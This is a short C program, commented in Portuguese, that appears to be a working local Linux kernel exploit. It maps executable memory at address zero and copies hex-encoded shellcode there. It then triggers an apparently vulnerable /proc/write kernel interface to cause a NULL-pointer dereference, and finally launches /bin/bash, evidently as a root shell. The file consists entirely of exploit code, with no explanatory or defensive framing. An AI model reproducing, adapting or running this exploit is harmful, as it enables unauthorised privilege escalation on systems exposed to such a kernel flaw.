#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

// objdump -d payload
// alterar vendo a saida do payload
char payload[] = "\x31\xc0\xe8\x79\x8b\x09\xa0\xe8\x04\x88\x09\x0a\xc3";

int main(){
	mmap(0, 4096,
	 PROT_READ | PROT_WRITE | PROT_EXEC,
	 MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, 
	 -1 ,0);
	memcpy(0, payload, sizeof(payload));

	int fd = open("/proc/write", O_WRONLY);
	write(fd, "foo", 3);

	system("/bin/bash");
}